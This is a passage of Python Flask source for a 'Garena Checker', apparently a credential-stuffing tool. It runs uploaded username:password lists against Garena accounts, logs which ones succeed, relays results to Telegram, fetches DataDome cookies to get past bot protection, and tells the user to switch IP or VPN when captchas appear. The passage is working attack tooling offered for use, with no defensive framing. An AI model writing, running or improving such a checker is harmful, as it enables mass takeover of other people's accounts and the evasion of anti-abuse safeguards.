                        failed_out.write(f"{username}:{password} - {result}\n")
                    log_message(f"User: {username} | Pass: {password} ➔ {result}", "text-danger")

            else:
                log_message(f"Invalid format: {acc} ➔ Skipping", "text-warning")
            
            with status_lock: check_status['stats'] = stats.copy()
            
            save_progress(file_path, original_index)
        
        if not stop_event.is_set():
            is_complete = True
            with status_lock:
                check_status['progress'] = total_accounts
                summary = ["--- CHECKING COMPLETE ---", f"Total: {total_accounts} | Success: {stats['successful']} | Failed: {stats['failed']}"]
                check_status['final_summary'] = "\n".join(summary)
            log_message("--- CHECKING COMPLETE ---", "text-success")

    except Exception as e:
        log_message(f"An unexpected error occurred in the checker task: {e}", "text-danger")
        import traceback
        log_message(traceback.format_exc(), "text-danger")
    finally:
        if is_complete:
            clear_progress()
            if auto_delete:
                try:
                    os.remove(file_path)
                    log_message(f"Source file '{os.path.basename(file_path)}' has been deleted.", "text-info")
                except OSError as e:
                    log_message(f"Failed to delete source file: {e}", "text-danger")
        with status_lock:
            check_status['running'] = False

# --- Flask Routes ---

@app.route('/')
def index():
    log_message("Welcome to Garena Checker! The app is ready.", "text-info")
    bot_token, chat_id = load_telegram_config()
    return render_template('index.html', bot_token=bot_token or '', chat_id=chat_id or '')

@app.route('/start_check', methods=['POST'])
def start_check():
    global check_status, stop_event, captcha_pause_event
    
    with status_lock:
        if check_status['running']:
            return jsonify({'status': 'error', 'message': 'A check is already running.'}), 400

        check_status = {
            'running': True, 'progress': 0, 'total': 0, 'logs': [], 'stats': {},
            'final_summary': None, 'captcha_detected': False, 'stop_requested': False, 
            'current_account': '', 'current_ip': None,
        }
        stop_event.clear()
        captcha_pause_event.clear()

    file = request.files.get('account_file')
    if not file or file.filename == '':
        return jsonify({'status': 'error', 'message': 'No file selected.'}), 400
    
    filename = secure_filename(file.filename)
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(file_path)

    bot_token = request.form.get('telegram_bot_token')
    chat_id = request.form.get('telegram_chat_id')
    save_creds = request.form.get('save_telegram_creds')
    
    if save_creds and bot_token and chat_id: save_telegram_config(bot_token, chat_id)

    cookie_module = request.form.get('cookie_module', 'ken_cookie')
    cookie_number = request.form.get('cookie_number', type=int, default=0)
    
    use_cookie_set = 'use_cookie_set' in request.form
    auto_delete = 'auto_delete' in request.form
    force_restart = 'force_restart' in request.form
    telegram_level_filter = request.form.get('telegram_level_filter', 'none')

    log_message("Starting new check...", "text-info")
    thread = threading.Thread(target=run_check_task, args=(
        file_path, bot_token, chat_id, cookie_module, use_cookie_set, 
        auto_delete, force_restart, telegram_level_filter, cookie_number
    ))
    thread.daemon = True
    thread.start()

    return jsonify({'status': 'success', 'message': 'Checker process initiated.'})

@app.route('/status')
def get_status():
    with status_lock:
        return jsonify(check_status)

def trigger_stop():
    with status_lock:
        if not check_status['running']: return
        check_status['stop_requested'] = True
    stop_event.set()
    if not captcha_pause_event.is_set(): captcha_pause_event.set()
    log_message("Stop request received. Shutting down gracefully...", "text-warning")

@app.route('/stop_check', methods=['POST'])
def stop_check_route():
    trigger_stop()
    return jsonify({'status': 'success', 'message': 'Stop signal sent.'})

@app.route('/captcha_action', methods=['POST'])
def captcha_action():
    action = request.form.get('action')
    log_message(f"Captcha action received: {action}", "text-info")

    if action == 'fetch_pool':
        new_pool = fetch_new_datadome_pool(num_cookies=5)
        if new_pool:
            log_message(f"Fetched {len(new_pool)} cookies. They will be saved and used in the next session.", "text-info")
            for c in new_pool: save_datadome_cookie(c)

    elif action == 'retry_ip':
        log_message("Verifying IP address change...", "text-info")
        with status_lock:
            old_ip = check_status.get('current_ip', 'Unknown')
        
        new_ip = get_public_ip()
        log_message(f"Old IP: {old_ip}", "text-white")
        log_message(f"New IP: {new_ip}", "text-white")

        if new_ip and new_ip != old_ip:
            log_message("✅ IP has successfully changed! Resuming check.", "text-success")
            with status_lock:
                check_status['current_ip'] = new_ip
            # Here you could add logic to clear cookie cooldowns if you want
        else:
            log_message("❌ IP address is the same. Please change your IP/VPN and try again.", "text-danger")

    elif action == 'stop_checker':
        trigger_stop()
        captcha_pause_event.set()
        return jsonify({'status': 'success', 'message': 'Stop signal sent.'})

    elif action == 'next_cookie':
        log_message("[🔄] Acknowledged. Will try with a different cookie upon resuming.", "text-info")
    
    captcha_pause_event.set()
    return jsonify({'status': 'success', 'message': 'Action processed.'})

@app.route('/results/<path:filename>')
def download_file(filename):
    results_dir = get_results_directory()
    log_message(f"Attempting to download from: {results_dir}/{filename}", "text-info")
    return send_from_directory(results_dir, filename, as_attachment=True)

if __name__ == '__main__':
    print("Starting Flask server for local development at http://127.0.0.1:5000")
    app.run(host='127.0.0.1', port=5000, debug=True)